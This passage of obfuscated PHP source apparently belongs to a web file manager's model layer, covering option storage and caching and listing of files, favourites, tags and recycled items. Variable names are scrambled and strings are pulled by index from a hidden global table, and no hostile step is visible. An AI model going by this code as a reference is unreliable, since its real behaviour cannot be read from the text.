!isset($•ß˜¬Ş[$¨Üô‚¥])) { return $¨Üô‚¥; } for ($µ¯Ñ°ŒÈ = 1; $µ¯Ñ°ŒÈ < count($•ß˜¬Ş); $µ¯Ñ°ŒÈ++) { $íŸÜ¯ÑÒ = $¨Üô‚¥ . "\50{$µ¯Ñ°ŒÈ}\51"; if (!isset($•ß˜¬Ş[$íŸÜ¯ÑÒ])) { return $íŸÜ¯ÑÒ; } } return $íŸÜ¯ÑÒ; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($ãõâ©äÉ = false, $ƒ¯–åŠ¨ = '', $Ö¬¸¼ÅÉ = false, $ï¶”¦Áş = true) { $¦º½‚ =& $_SERVER[öæÛ¿©¿]; $‰ïú“ÛÁ = $this->cacheGet($ƒ¯–åŠ¨); $ïºï³° = $this->optionDefault($ƒ¯–åŠ¨); $ïºï³° = is_array($ïºï³°) ? $ïºï³° : array(); if (is_array($‰ïú“ÛÁ)) { if ($ï¶”¦Áş) { $‰ïú“ÛÁ = array_merge($ïºï³°, $‰ïú“ÛÁ); } return $ãõâ©äÉ ? isset($‰ïú“ÛÁ[$ãõâ©äÉ]) ? $‰ïú“ÛÁ[$ãõâ©äÉ] : null : $‰ïú“ÛÁ; } $‚Ú¤ÅùØ = $this->filterWhere(array($¦º½‚[33] => $ƒ¯–åŠ¨)); $‰ïú“ÛÁ = $this->where($‚Ú¤ÅùØ)->select(); $‰ïú“ÛÁ = array_to_keyvalue($‰ïú“ÛÁ, $¦º½‚[95], $¦º½‚[451]); foreach ($‰ïú“ÛÁ as $éÎĞÊÃ => $Ïô’óÃå) { if ($Ö¬¸¼ÅÉ || in_array($éÎĞÊÃ, $this->jsonField)) { $‰ïú“ÛÁ[$éÎĞÊÃ] = json_decode($Ïô’óÃå, !0); } } $this->cacheSet($ƒ¯–åŠ¨, $‰ïú“ÛÁ); if ($ï¶”¦Áş) { $‰ïú“ÛÁ = array_merge($ïºï³°, $‰ïú“ÛÁ); } return $ãõâ©äÉ ? $‰ïú“ÛÁ[$ãõâ©äÉ] : $‰ïú“ÛÁ; } public function set($¼ô÷¯Ş±, $¤˜øôå· = false, $É‚¹ş…ô = '') { $‡Ò—§Ç« =& $_SERVER[öæÛ¿©¿]; if (!$¼ô÷¯Ş±) { return !0; } $”·Â·Œ¡ = $this->get(!1, $É‚¹ş…ô, !1, !1); $”·Â·Œ¡ = is_array($”·Â·Œ¡) ? $”·Â·Œ¡ : array(); $œÒ‘Ïª“ = array(); $®İ¤ğµ = array(); $µÍ§¯½× = array(); $ı™ÆõÎ« = is_array($¼ô÷¯Ş±) ? $¼ô÷¯Ş± : array($¼ô÷¯Ş± => $¤˜øôå·); $íÈ½ü—¤ = $this->filterWhere(array($‡Ò—§Ç«[33] => $É‚¹ş…ô)); foreach ($ı™ÆõÎ« as $ğœï‹Ï³ => $»Øµµßº) { if (is_array($»Øµµßº)) { $»Øµµßº = json_encode_force($»Øµµßº); } $this->checkLength($»Øµµßº, !1, $this->tableName . $‡Ò—§Ç«[4] . $¼ô÷¯Ş±); $»Øµµßº = self::textEncode($»Øµµßº); if (array_key_exists($ğœï‹Ï³, $”·Â·Œ¡)) { $±†À–Ü = is_array($”·Â·Œ¡[$ğœï‹Ï³]) ? json_encode_force($”·Â·Œ¡[$ğœï‹Ï³]) : $”·Â·Œ¡[$ğœï‹Ï³]; $±†À–Ü = self::textEncode($±†À–Ü); if ($±†À–Ü === $»Øµµßº) { continue; } $®İ¤ğµ[] = array($‡Ò—§Ç«[95], $ğœï‹Ï³, $‡Ò—§Ç«[451], $»Øµµßº, $‡Ò—§Ç«[88], time()); } else { $×¢ëí„ƒ = array($‡Ò—§Ç«[33] => $É‚¹ş…ô, $‡Ò—§Ç«[95] => $ğœï‹Ï³, $‡Ò—§Ç«[451] => $»Øµµßº); $œÒ‘Ïª“[] = $this->filterWhere($×¢ëí„ƒ); } } if (!$œÒ‘Ïª“ && !$®İ¤ğµ) { return !0; } $this->cacheRemove($É‚¹ş…ô); $ÚÄ¤¹ÒË = $this->cacheKey($‡Ò—§Ç«[487]); CacheLock::lock($ÚÄ¤¹ÒË); if ($œÒ‘Ïª“) { $this->addAll($œÒ‘Ïª“); } if ($®İ¤ğµ) { $this->saveAll($®İ¤ğµ, $íÈ½ü—¤); } CacheLock::unlock($ÚÄ¤¹ÒË); return !0; } protected function optionDefault($Û³£ïˆ² = '') { return !1; } public function setDeep($¹ÙãÍª, $­íÏğÁø = false, $‚ß­Ùİµ = '') { $ùù«•¢ = explode($_SERVER[öæÛ¿©¿][10], $¹ÙãÍª); $ÌÙÛ§Š™ = $this->get(); array_set_value($ÌÙÛ§Š™, $¹ÙãÍª, $­íÏğÁø); $this->set($ùù«•¢[0], $ÌÙÛ§Š™[$ùù«•¢[0]], $‚ß­Ùİµ); } public function remove($èáŠÍŸ, $´Å¹óãù = '') { $¼¢Çû =& $_SERVER[öæÛ¿©¿]; $this->cacheRemove($´Å¹óãù); $ËŞ–·ß¨ = $this->filterWhere(array($¼¢Çû[95] => $èáŠÍŸ, $¼¢Çû[33] => $´Å¹óãù)); if (is_null($èáŠÍŸ)) { unset($ËŞ–·ß¨[$¼¢Çû[95]]); } return $this->where($ËŞ–·ß¨)->delete(); } public function removeArr($Ç·ã¶½Ô, $²ı°¬ÉÅ = '') { $•ÅÎÉª =& $_SERVER[öæÛ¿©¿]; if (!$Ç·ã¶½Ô || !is_array($Ç·ã¶½Ô)) { return !0; } $this->cacheRemove($²ı°¬ÉÅ); $âˆşš¾ = $this->filterWhere(array($•ÅÎÉª[33] => $²ı°¬ÉÅ, $•ÅÎÉª[95] => array($•ÅÎÉª[7], $Ç·ã¶½Ô))); return $this->where($âˆşš¾)->delete(); } public function cacheSet($ñêÈ±ÓÁ, $õÆ“‚Ã = false) { return Cache::set($this->cacheKey($ñêÈ±ÓÁ), $õÆ“‚Ã); } public function cacheGet($‰®¹„Ş‹) { return Cache::get($this->cacheKey($‰®¹„Ş‹)); } public function cacheRemove($äÉ…ıˆÉ) { return Cache::remove($this->cacheKey($äÉ…ıˆÉ)); } protected function filterWhere($²ì¶Ñóá) { return $²ì¶Ñóá; } protected function cacheKey($çÜë˜»£) { return $çÜë˜»£; } } class SourceListModel extends ModelBase { protected $tableName = "\x69\157\137\163\157\x75\162\x63\145"; protected $tableMeta = array("\x74\141\x62\154\x65\x4e\x61\155\x65" => "\151\157\137\x73\157\x75\x72\143\145\x5f\155\145\164\x61", "\155\145\164\141\106\x69\x65\x6c\x64" => "\163\157\x75\x72\x63\145\111\104"); protected $dataAuto = array(array("\155\157\x64\x69\146\x79\x54\151\x6d\145", "\164\151\x6d\x65", "\x69\156\x73\x65\x72\x74", "\x66\x75\156\143\164\x69\157\x6e"), array("\x63\162\x65\x61\x74\145\x54\151\155\145", "\164\151\x6d\x65", "\x69\156\x73\145\x72\164", "\x66\165\156\x63\x74\151\157\x6e"), array("\166\151\x65\x77\x54\151\155\145", "\164\x69\x6d\x65", "\x69\x6e\163\145\x72\x74", "\x66\x75\x6e\143\x74\x69\157\156")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($×¸ÑôË¯) { return $this->listSource(array($_SERVER[öæÛ¿©¿][488] => $×¸ÑôË¯)); } public function typeName($±êÛß) { static $š»‡¤ª = array(self::TYPE_SYSTEM => "\x73\x79\x73\164\145\x6d", self::TYPE_USER => "\x75\163\x65\x72", self::TYPE_GROUP => "\x67\162\x6f\x75\160"); return $š»‡¤ª[$±êÛß . $_SERVER[öæÛ¿©¿][12]]; } public function sourceListInfo($¿¿ì¿÷¹, $Æìà‘¤• = false) { $©À—ìÌö =& $_SERVER[öæÛ¿©¿]; $¿¿ì¿÷¹ = $¿¿ì¿÷¹ ? $¿¿ì¿÷¹ : array(); $¿¿ì¿÷¹ = array_filter(array_unique($¿¿ì¿÷¹)); if (!$¿¿ì¿÷¹) { return array(); } $­èåå¢ğ = $this->where(array($©À—ìÌö[192] => array($©À—ìÌö[7], $¿¿ì¿÷¹)))->select(); $this->_listDataApply($­èåå¢ğ, $Æìà‘¤•); return array_to_keyvalue($­èåå¢ğ, $©À—ìÌö[192]); } public function pathInfoFilter(&$·‡ô½óå) { $ØÅÔ‘¬Ø =& $_SERVER[öæÛ¿©¿]; static $Ÿ°ëÛ‡é = false; static $÷Ì Û–‘ = false; static $ŠƒÛŒ„ = false; if (!$Ÿ°ëÛ‡é) { $‚û£À¦ã = $ØÅÔ‘¬Ø[489]; $‚û£À¦ã .= $ØÅÔ‘¬Ø[490]; $‚û£À¦ã .= $ØÅÔ‘¬Ø[491]; $’á§Á…Î = $ØÅÔ‘¬Ø[492]; $¬Èù¯ = explode($ØÅÔ‘¬Ø[50], $’á§Á…Î); $Ÿ°ëÛ‡é = explode($ØÅÔ‘¬Ø[50], $‚û£À¦ã); $÷Ì Û–‘ = array(); foreach ($Ÿ°ëÛ‡é as $Ò¶ß¿œÏ) { if (in_array($Ò¶ß¿œÏ, $¬Èù¯)) { continue; } $÷Ì Û–‘[] = $Ò¶ß¿œÏ; } $ŠƒÛŒ„ = explode($ØÅÔ‘¬Ø[50], $ØÅÔ‘¬Ø[493]); } foreach ($ŠƒÛŒ„ as $©ÁæÊïŸ) { if (isset($·‡ô½óå[$©ÁæÊïŸ])) { $·‡ô½óå[$©ÁæÊïŸ] = intval($·‡ô½óå[$©ÁæÊïŸ]); } } $·‡ô½óå[$ØÅÔ‘¬Ø[87]] = $ØÅÔ‘¬Ø[494] . $·‡ô½óå[$ØÅÔ‘¬Ø[192]] . $ØÅÔ‘¬Ø[495]; $·‡ô½óå[$ØÅÔ‘¬Ø[33]] = $·‡ô½óå[$ØÅÔ‘¬Ø[496]] == 1 ? $ØÅÔ‘¬Ø[78] : $ØÅÔ‘¬Ø[231]; $·‡ô½óå[$ØÅÔ‘¬Ø[189]] = $this->typeName($·‡ô½óå[$ØÅÔ‘¬Ø[189]]); if ($·‡ô½óå[$ØÅÔ‘¬Ø[496]] != 1) { $·‡ô½óå[$ØÅÔ‘¬Ø[167]] = $·‡ô½óå[$ØÅÔ‘¬Ø[497]]; unset($·‡ô½óå[$ØÅÔ‘¬Ø[497]]); } $€ûÚ®ñŠ = $Ÿ°ëÛ‡é; if (isset($·‡ô½óå[$ØÅÔ‘¬Ø[498]]) && $·‡ô½óå[$ØÅÔ‘¬Ø[498]][$ØÅÔ‘¬Ø[499]] == -1) { $€ûÚ®ñŠ = $÷Ì Û–‘; } $·‡ô½óå = array_field_key($·‡ô½óå, $€ûÚ®ñŠ); return $·‡ô½óå; } public function listUserFav() { $õó¥†üÓ =& $_SERVER[öæÛ¿©¿]; $ë†Èƒ°¢ = Model($õó¥†üÓ[500])->listData(); $şì¯·ùÁ = array_filter_by_field($ë†Èƒ°¢, $õó¥†üÓ[33], $õó¥†üÓ[501]); $şì¯·ùÁ = array_to_keyvalue($şì¯·ùÁ, $õó¥†üÓ[12], $õó¥†üÓ[87]); if ($şì¯·ùÁ) { $°öµÊ¶ = $this->listSource(array($õó¥†üÓ[502] => array($õó¥†üÓ[503], $şì¯·ùÁ))); } $°öµÊ¶ = array_to_keyvalue($°öµÊ¶[$õó¥†üÓ[446]], $õó¥†üÓ[192]); foreach ($ë†Èƒ°¢ as &$ÙŞ‰—Ö¦) { $ÙŞ‰—Ö¦ = array($õó¥†üÓ[504] => $ÙŞ‰—Ö¦[$õó¥†üÓ[483]], $õó¥†üÓ[505] => $ÙŞ‰—Ö¦[$õó¥†üÓ[32]], $õó¥†üÓ[506] => $ÙŞ‰—Ö¦[$õó¥†üÓ[87]], $õó¥†üÓ[507] => $ÙŞ‰—Ö¦[$õó¥†üÓ[33]], $õó¥†üÓ[508] => $ÙŞ‰—Ö¦[$õó¥†üÓ[232]], $õó¥†üÓ[509] => $ÙŞ‰—Ö¦[$õó¥†üÓ[88]]); if ($ÙŞ‰—Ö¦[$õó¥†üÓ[33]] == $õó¥†üÓ[501] && $°öµÊ¶[$ÙŞ‰—Ö¦[$õó¥†üÓ[87]]]) { $ÙŞ‰—Ö¦[$õó¥†üÓ[90]] = $°öµÊ¶[$ÙŞ‰—Ö¦[$õó¥†üÓ[87]]]; } } unset($ÙŞ‰—Ö¦); return $ë†Èƒ°¢; } public function listUserTag($æö‡¿¼ó) { $·Íİ÷ª´ =& $_SERVER[öæÛ¿©¿]; if ($æö‡¿¼ó && !is_array($æö‡¿¼ó)) { $æö‡¿¼ó = array($æö‡¿¼ó); } $ÓÃş€µ = Model($·Íİ÷ª´[510])->listData(); $Ì„âÕÁç = array(); $÷šµÉşø = array(); foreach ($ÓÃş€µ as $¿†±Êê‹) { $—’Ú»ŞŸ = $¿†±Êê‹[$·Íİ÷ª´[87]]; if (!$—’Ú»ŞŸ) { continue; } if (!isset($÷šµÉşø[$—’Ú»ŞŸ])) { $÷šµÉşø[$—’Ú»ŞŸ] = array(); } $÷šµÉşø[$—’Ú»ŞŸ][] = $¿†±Êê‹[$·Íİ÷ª´[511]]; $Ì„âÕÁç[$¿†±Êê‹[$·Íİ÷ª´[87]]] = $¿†±Êê‹; } $ùøÛâÄÛ = array(); $ÀŸ÷“ÚŸ = array(); $àôºıÂ° = array(); foreach ($÷šµÉşø as $úî¨¥í• => $Ü–ûËÌÒ) { $ù èÔ±ñ = !0; if (!$æö‡¿¼ó) { $ùøÛâÄÛ[] = $úî¨¥í•; continue; } foreach ($æö‡¿¼ó as $ó‡½Â¸¼) { if (!in_array($ó‡½Â¸¼, $Ü–ûËÌÒ)) { $ù èÔ±ñ = !1; break; } } if (!$ù èÔ±ñ) { continue; } if (!is_numeric($úî¨¥í•)) { $‹“½Ñ› = $Ì„âÕÁç[$úî¨¥í•]; $Àç¥ò = array($·Íİ÷ª´[32] => $‹“½Ñ›[$·Íİ÷ª´[32]], $·Íİ÷ª´[87] => $‹“½Ñ›[$·Íİ÷ª´[87]], $·Íİ÷ª´[33] => $‹“½Ñ›[$·Íİ÷ª´[33]], $·Íİ÷ª´[90] => array($·Íİ÷ª´[512] => 1), $·Íİ÷ª´[233] => !0); if ($‹“½Ñ›[$·Íİ÷ª´[33]] == $·Íİ÷ª´[231]) { $àôºıÂ°[] = $Àç¥ò; } if ($‹“½Ñ›[$·Íİ÷ª´[33]] == $·Íİ÷ª´[78]) { $ÀŸ÷“ÚŸ[] = $Àç¥ò; } continue; } $ùøÛâÄÛ[] = $úî¨¥í•; } if ($ùøÛâÄÛ) { $¾ÄÏĞÄ = $this->listSource(array($·Íİ÷ª´[502] => array($·Íİ÷ª´[503], $ùøÛâÄÛ))); } $¾ÄÏĞÄ = $¾ÄÏĞÄ ? $¾ÄÏĞÄ : array($·Íİ÷ª´[85] => array(), $·Íİ÷ª´[86] => array()); $¾ÄÏĞÄ[$·Íİ÷ª´[85]] = array_merge($¾ÄÏĞÄ[$·Íİ÷ª´[85]], $ÀŸ÷“ÚŸ); $¾ÄÏĞÄ[$·Íİ÷ª´[86]] = array_merge($¾ÄÏĞÄ[$·Íİ÷ª´[86]], $àôºıÂ°); if (isset($¾ÄÏĞÄ[$·Íİ÷ª´[443]]) && count($ùøÛâÄÛ) == $¾ÄÏĞÄ[$·Íİ÷ª´[443]][$·Íİ÷ª´[444]]) { return $¾ÄÏĞÄ; } $†ú…Ö = array(); $‰ÉÈ¶óª = array_to_keyvalue($¾ÄÏĞÄ[$·Íİ÷ª´[85]], $·Íİ÷ª´[12], $·Íİ÷ª´[192]); $³¢§×ğ = array_to_keyvalue($¾ÄÏĞÄ[$·Íİ÷ª´[86]], $·Íİ÷ª´[12], $·Íİ÷ª´[192]); $øÌÛ‹• = array_merge($³¢§×ğ, $‰ÉÈ¶óª); foreach ($ùøÛâÄÛ as $—’Ú»ŞŸ) { if (!in_array($—’Ú»ŞŸ, $øÌÛ‹•)) { $†ú…Ö[] = $—’Ú»ŞŸ; } } if ($†ú…Ö) { Model($·Íİ÷ª´[513])->removeBySource($†ú…Ö); } return $¾ÄÏĞÄ; } public function listUserRecycle() { $Ã¤ã×¦ =& $_SERVER[öæÛ¿©¿]; $×’¿ÔÛ = Model($Ã¤ã×¦[514])->listData(); if (!$×’¿ÔÛ) { return array(); } $»Ä½—›ß = array($Ã¤ã×¦[502] => array($Ã¤ã×¦[503], $×’¿ÔÛ), $Ã¤ã×¦[515] => 1); return $this->listSource($»Ä½—›ß); } public function listSource($ûîñÖ•, $áª³ü¥Œ = 3000, $†Ò™ˆÕâ = false) { $¸Ü—¤—´ =& $_SERVER[öæÛ¿©¿]; if (!isset($ûîñÖ•[$¸Ü—¤—´[516]])) { $ûîñÖ•[$¸Ü—¤—´[516]] = 0; } if (isset($ûîñÖ•[$¸Ü—¤—´[191]]) && $ûîñÖ•[$¸Ü—¤—´[191]] == $¸Ü—¤—´[229]) { $ûîñÖ•[$¸Ü—¤—´[497]] = array($¸Ü—¤—´[464], $¸Ü—¤—´[12]); } if (isset($ûîñÖ•[$¸Ü—¤—´[191]])) { $ûîñÖ•[$¸Ü—¤—´[191]] = intval($ûîñÖ•[$¸Ü—¤—´[191]]); } $”ÈÑâàò = $¸Ü—¤—´[517]; $ê›ÊÌ¶ = $this->field($”ÈÑâàò)->_makeOrder()->where($ûîñÖ•)->selectPage($áª³ü¥Œ); $this->_listPageCheck($ê›ÊÌ¶, $”ÈÑâàò, $ûîñÖ•); $this->_listDataApply($ê›ÊÌ¶[$¸Ü—¤—´[446]], $†Ò™ˆÕâ); $this->_listMake($ê›ÊÌ¶); return $ê›ÊÌ¶; } private function _listPageCheck(&$Ô´±Ì‘á, $›øãöëÔ, $¦Ù¬¥ñÙ) { $‡¾ñğËÙ =& $_SERVER[öæÛ¿©¿]; if (!is_array($Ô´±Ì‘á[$‡¾ñğËÙ[443]])) { return; } $–ùØı¨Ë = $Ô´±Ì‘á[$‡¾ñğËÙ[443]]; if ($–ùØı¨Ë[$‡¾ñğËÙ[445]] <= 1) { return; } if ($–ùØı¨Ë[$‡¾ñğËÙ[444]] >= 100000) { return; } if (Model($‡¾ñğËÙ[518])->get($‡¾ñğËÙ[519]) != $‡¾ñğËÙ[520]) { return; } $›øãöëÔ = str_replace(array($‡¾ñğËÙ[53], $‡¾ñğËÙ[418], $‡¾ñğËÙ[286]), $‡¾ñğËÙ[12], $›øãöëÔ); $›øãöëÔ = $‡¾ñğËÙ[521] . str_replace($‡¾ñğËÙ[50], $‡¾ñğËÙ[522], $›øãöëÔ) . $‡¾ñğËÙ[523]; $ËÈÙ¸² = $‡¾ñğËÙ[524]; $ËÈÙ¸² = $ËÈÙ¸² . $‡¾ñğËÙ[525]; $¤¢³Éû = $–ùØı¨Ë[$‡¾ñğËÙ[440]] * ($–ùØı¨Ë[$‡¾ñğËÙ[429]] - 1) . $‡¾ñğËÙ[50] . $–ùØı¨Ë[$‡¾ñğËÙ[440]]; $­ŠÙõÊó = $this->_makeOrder(!0); $«‘¦Õø = $‡¾ñğËÙ[521] . str_replace($‡¾ñğËÙ[50], $‡¾ñğËÙ[522], $­ŠÙõÊó[0]); if (strpos($«‘¦Õø, $‡¾ñğËÙ[526])) { $«‘¦Õø = str_replace($‡¾ñğËÙ[526], $‡¾ñğËÙ[527], $«‘¦Õø); } else { $«‘¦Õø .= $‡¾ñğËÙ[528] . $­ŠÙõÊó[1]; } $Ö½©ÊÔö = array(); foreach ($¦Ù¬¥ñÙ as $ëËŸÁó¯ => $éİí®÷©) { $Ö½©ÊÔö[$‡¾ñğËÙ[521] . $ëËŸÁó¯] = $éİí®÷©; } $this->alias($‡¾ñğËÙ[529])->field($›øãöëÔ)->limit($¤¢³Éû)->order($«‘¦Õø); $ËßÃÖÙˆ = $this->join($ËÈÙ¸²)->where($Ö½©ÊÔö)->select(); if ($ËßÃÖÙˆ) { $Ô´±Ì‘á[$‡¾ñğËÙ[446]] = $ËßÃÖÙˆ; } } protected function _makeOrder($Ò«—ü÷¿ = false) { $ßş¾ôËÊ =& $_SERVER[öæÛ¿©¿]; $š¼¹´Ğõ = Model($ßş¾ôËÊ[530])->get($ßş¾ôËÊ[531]); $»£šíÀ = Model($ßş¾ôËÊ[530])->get($ßş¾ôËÊ[532]); $ù‹¡¼Ó… = array($ßş¾ôËÊ[533] => $ßş¾ôËÊ[534], $ßş¾ôËÊ[535] => $ßş¾ôËÊ[536]); $éÇÓ¨Î = array($ßş¾ôËÊ[32] => $ßş¾ôËÊ[32], $ßş¾ôËÊ[79] => $ßş¾ôËÊ[79], $ßş¾ôËÊ[167] => $ßş¾ôËÊ[497], $ßş¾ôËÊ[537] => $ßş¾ôËÊ[537], $ßş¾ôËÊ[538] => $ßş¾ôËÊ[539], $ßş¾ôËÊ[232] => $ßş¾ôËÊ[232], $ßş¾ôËÊ[88] => $ßş¾ôËÊ[88]); $µÍº„• = Input::get($ßş¾ôËÊ[540], $ßş¾ôËÊ[7], $š¼¹´Ğõ, array_keys($éÇÓ¨Î)); $šáÕİ–í = Input::get($ßş¾ôËÊ[541], $ßş¾ôËÊ[7], $»£šíÀ, array_keys($ù‹¡¼Ó…)); if (!in_array($µÍº„•, array_keys($éÇÓ¨Î))) { $µÍº„• = $ßş¾ôËÊ[32]; } if (!in_array($šáÕİ–í, array_keys($ù‹¡¼Ó…))) { $µÍº„• = $ßş¾ôËÊ[533]; } if ($µÍº„• == $ßş¾ôËÊ[32]) { } $ãµøŒå = $ßş¾ôËÊ[542] . $éÇÓ¨Î[$µÍº„•] . $ßş¾ôËÊ[53] . $ù‹¡¼Ó…[$šáÕİ–í]; $ãµøŒå = rtrim(trim($ãµøŒå), $ßş¾ôËÊ[50]); if ($Ò«—ü÷¿) { return array($ãµøŒå, $ù‹¡¼Ó…[$šáÕİ–í]); } return $this->order($ãµøŒå); } protected function _listDataApplyItem($åßÇ—÷…, $¾ıô±±­ = false) { $—´Ñõ°Û = array($åßÇ—÷…); $this->_listDataApply($—´Ñõ°Û, $¾ıô±±­); return $—´Ñõ°Û[0]; } protected function _listDataApply(&$ì¾¾‰È±, $ÉÂò§â© = false) { $‚©¬Ãåó =& $_SERVER[öæÛ¿©¿]; if (!$ì¾¾‰È±) { $ì¾¾‰È± = array(); return; } $Û©×Šƒš = array_to_keyvalue($ì¾¾‰È±, $‚©¬Ãåó[12], $‚©¬Ãåó[192]); $Û©×Šƒš = array_unique($Û©×Šƒš); $Û©×Šƒš = array_to_int($Û©×Šƒš); $this->_listSourceCache($ì¾¾‰È±); if (!$ÉÂò§â©) { $this->_listAppendMeta($ì¾¾‰È±, $Û©×Šƒš); $this->_listAppendFileMeta($ì¾¾‰È±, $Û©×Šƒš); $this->_listAppendChildren($ì¾¾‰È±, $Û©×Šƒš); } $this->_listAppendPath($ì¾¾‰È±); $this->_listAppendAuth($ì¾¾‰È±); $this->_listAppendSourceInfo($ì¾¾‰È±, $Û©×Šƒš); $this->_listAppendUser($ì¾¾‰È±); $this->_listFilterInfo($ì¾¾‰È±, $ÉÂò§â©); $this->_listAppendAuthSecret($ì¾¾‰È±); } protected function _listSourceCache($½çºÓ¦È) { $ˆŒÈôñ² =& $_SERVER[öæÛ¿©¿]; foreach ($½çºÓ¦È as $Ã¬‚ËŠ®) { self::$cacheSourceInfo[$ˆŒÈôñ²[543] . $Ã¬‚ËŠ®[$ˆŒÈôñ²[192]]] = $Ã¬‚ËŠ®; } } protected function _listFilterInfo(&$•ÃÂÓÄ², $ü´ŒŸ¥ = false) { $¸ˆ¾ÊÛ =& $_SERVER[öæÛ¿©¿]; foreach ($•ÃÂÓÄ² as &$€š£ ñï) { $€š£ ñï = $this->pathInfoFilter($€š£ ñï); self::$cachePathInfo[$¸ˆ¾ÊÛ[544] . intval($ü´ŒŸ¥) . $¸ˆ¾ÊÛ[473] . $€š£ ñï[$¸ˆ¾ÊÛ[192]]] = $€š£ ñï; } unset($€š£ ñï); } protected function _listMake(&$˜±ÂˆØÑ) { $ë•éâ¶¥ =& $_SERVER[öæÛ¿©¿]; $˜±ÂˆØÑ[$ë•éâ¶¥[85]] = array(); $˜±ÂˆØÑ[$ë•éâ¶¥[86]] = array(); foreach ($˜±ÂˆØÑ[$ë•éâ¶¥[446]] as $Ìª‰ÏÎ) { $¥¯®ÆÚÆ = $Ìª‰ÏÎ[$ë•éâ¶¥[496]] == 1 ? $ë•éâ¶¥[85] : $ë•éâ¶¥[86]; $˜±ÂˆØÑ[$¥¯®ÆÚÆ][] = $Ìª‰ÏÎ; } unset($˜±ÂˆØÑ[$ë•éâ¶¥[446]]); } protected function _listAppendMeta(&$Ò¿ßÀÔ˜, $±‡Œø‡å) { $éÏ´Ç¼ =& $_SERVER[öæÛ¿©¿]; $Û„Û…šğ = array($éÏ´Ç¼[502] => array($éÏ´Ç¼[503], $±‡Œø‡å)); $øÉäœ = Model($éÏ´Ç¼[545])->field($éÏ´Ç¼[546])->where($Û„Û…šğ)->select(); if (!$øÉäœ) { return; } $ù“°ÍÏ· = array($éÏ´Ç¼[547], $éÏ´Ç¼[548], $éÏ´Ç¼[527]); $àĞéÇ¦¸ = array(); foreach ($øÉäœ as $æÂ ‚×ê) { if (!isset($àĞéÇ¦¸[$æÂ ‚×ê[$éÏ´Ç¼[192]]])) { $àĞéÇ¦¸[$æÂ ‚×ê[$éÏ´Ç¼[192]]] = array(); } if (in_array($æÂ ‚×ê[$éÏ´Ç¼[95]], $ù“°ÍÏ·)) { continue; } if ($æÂ ‚×ê[$éÏ´Ç¼[95]] == $éÏ´Ç¼[549]) { $æÂ ‚×ê[$éÏ´Ç¼[451]] = $éÏ´Ç¼[550]; } $àĞéÇ¦¸[$æÂ ‚×ê[$éÏ´Ç¼[192]]][$æÂ ‚×ê[$éÏ´Ç¼[95]]] = $æÂ ‚×ê[$éÏ´Ç¼[451]]; } foreach ($Ò¿ßÀÔ˜ as &$ûŸ›µüù) { $ûŸ›µüù[$éÏ´Ç¼[551]] = !1; if (isset($àĞéÇ¦¸[$ûŸ›µüù[$éÏ´Ç¼[192]]])) { $ûŸ›µüù[$éÏ´Ç¼[551]] = $àĞéÇ¦¸[$ûŸ›µüù[$éÏ´Ç¼[192]]]; } if ($this->fileIsLock($ûŸ›µüù) && $ûŸ›µüù[$éÏ´Ç¼[498]]) { $¹Öîøåò = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $ûŸ›µüù[$éÏ´Ç¼[498]][$éÏ´Ç¼[499]] = AuthModel::authDisable($ûŸ›µüù[$éÏ´Ç¼[498]][$éÏ´Ç¼[499]], $¹Öîøåò); $ûŸ›µüù[$éÏ´Ç¼[498]][$éÏ´Ç¼[552]][$éÏ´Ç¼[498]] = $ûŸ›µüù[$éÏ´Ç¼[498]][$éÏ´Ç¼[499]]; } } unset($ûŸ›µüù); } protected function _listAppendFileMeta(&$ä°¦÷™, $ôÓ¢®÷ã) { $Â¼şùÜ– =& $_SERVER[öæÛ¿©¿]; $ˆôà¹© = array_to_keyvalue($ä°¦÷™, $Â¼şùÜ–[12], $Â¼şùÜ–[553]); $ˆôà¹© = array_filter(array_unique($ˆôà¹©)); $ˆôà¹© = array_to_int($ˆôà¹©); if (!$ˆôà¹©) { return; } $ªßĞÃÁ¨ = array($Â¼şùÜ–[554] => array($Â¼şùÜ–[503], $ˆôà¹©)); $ÒŸµ³ğ = $Â¼şùÜ–[555]; $Ù¶˜ñ¶ø = Model($Â¼şùÜ–[556])->field($ÒŸµ³ğ)->where($ªßĞÃÁ¨)->select(); $Ù¶˜ñ¶ø = array_to_keyvalue($Ù¶˜ñ¶ø, $Â¼şùÜ–[553]); $¸¾¦™‰º = Model($Â¼şùÜ–[557])->field($Â¼şùÜ–[558])->where($ªßĞÃÁ¨)->select(); $¸¾¦™‰º = $¸¾¦™‰º ? $¸¾¦™‰º : array(); $É³÷şİ÷ = array(); foreach ($¸¾¦™‰º as $îä¨¡©ˆ) { if (!isset($É³÷şİ÷[$îä¨¡©ˆ[$Â¼şùÜ–[553]]])) { $É³÷şİ÷[$îä¨¡©ˆ[$Â¼şùÜ–[553]]] = array(); } $É³÷şİ÷[$îä¨¡©ˆ[$Â¼şùÜ–[553]]][$îä¨¡©ˆ[$Â¼şùÜ–[95]]] = $îä¨¡©ˆ[$Â¼şùÜ–[451]]; } foreach ($ä°¦÷™ as &$›˜Õí˜) { $¬é–³Ï = $›˜Õí˜[$Â¼şùÜ–[553]]; if (!$¬é–³Ï || !is_array($Ù¶˜ñ¶ø[$¬é–³Ï])) { continue; } $Ÿ±Ù·© = $Ù¶˜ñ¶ø[$¬é–³Ï]; $Ÿ±Ù·©[$Â¼şùÜ–[79]] = $›˜Õí˜[$Â¼şùÜ–[79]]; $Ÿ±Ù·©[$Â¼şùÜ–[32]] = $›˜Õí˜[$Â¼şùÜ–[32]]; if (!$Ÿ±Ù·©[$Â¼şùÜ–[559]]) { Model($Â¼şùÜ–[556])->fileMd5Check($Ÿ±Ù·©); } if (!isset(self::$cacheFileInfo[$Â¼şùÜ–[560] . $¬é–³Ï])) { self::$cacheFileInfo[$Â¼şùÜ–[560] . $¬é–³Ï] = array_merge(array(), $Ÿ±Ù·©); } unset($Ù¶˜ñ¶ø[$¬é–³Ï][$Â¼şùÜ–[87]]); $Õ¶­Á‹Œ = isset($É³÷şİ÷[$¬é–³Ï]) && is_array($É³÷şİ÷[$¬é–³Ï]) ? $É³÷şİ÷[$¬é–³Ï] : array(); $›˜Õí˜[$Â¼şùÜ–[168]] = array_merge($Õ¶­Á‹Œ, $Ù¶˜ñ¶ø[$¬é–³Ï]); if (isset($›˜Õí˜[$Â¼şùÜ–[168]][$Â¼şùÜ–[183]])) { 